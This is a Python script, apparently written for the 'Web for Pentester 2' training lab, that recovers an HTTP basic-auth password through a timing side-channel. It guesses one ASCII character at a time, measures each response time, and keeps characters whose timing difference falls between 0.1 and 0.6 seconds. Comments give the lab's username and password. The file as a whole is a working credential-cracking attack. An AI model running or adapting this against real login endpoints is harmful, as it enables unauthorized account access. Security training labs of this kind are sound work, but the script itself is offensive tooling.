# Note1: for this script to work, 200 status should only be raised if the login is success, also 401 for not success,
# otherwise this script will give false positive.
# Note2: this script depend on the timing, so the result cannot be guaranteed all the time because of the connection 
# between the server and the client.
# Note3: this script may not work correctly with password start with empty character because the diftime 
# value will big number, this can be fixed by changing the condition from "0.1 <= diftime <= 0.6" to "0.1 <= diftime".
# Note4: the min and max values in "0.1 <= diftime <= 0.6" should be tested according to the connection.

import requests
import time

url=input("Enter the URL, like http://ip/authentication/example2/: ") 
username=input("Enter the username: ") 
# It is hacker for authentication example2 in web for pentester2
password=input("Enter the start of the password if known, enter for none: ") 
# The full password is p4ssw0rd for authentication example2 in web for pentester2
lasttime=0

request =requests.get(url, auth=(username, password))
if request.status_code== 200:
# This is to check if the entered password is correct
    print("You have entered the right password which is "+password)
else:
    while request.status_code==401:
    # 401 Unauthorized response status code 
        for string in range(127):
        # Normal loop 0-127, this is for all ASCII codes 
        # https://www.ascii-code.com/ and https://python-reference.readthedocs.io/en/latest/docs/str/ASCII.html     
            start=time.time()
            request= requests.get(url, auth=(username, str(password+chr(string))))
            reqtime=time.time()-start
            print(string, chr(string))
            # chr() is to convert the string value into ASCII character
            print("The string",password+chr(string),"toke",reqtime, "second and it is not the password")  
            diftime =reqtime-lasttime
            print(diftime)
            lasttime=reqtime
            if 0.1 <= diftime <= 0.6:
                # if the difference like 0.22 then tha character most likely correct, 
                # while the not correct takes faster time like 0.0154 or much faster like 0.0025
                print("Correct character")
                password+=chr(string)
                # add the correct character to the password string                   
            if request.status_code== 200:
            # if the status is 200 then the password assumed to be correct and the program should be stop 
                print("The password is "+password)
                exit()

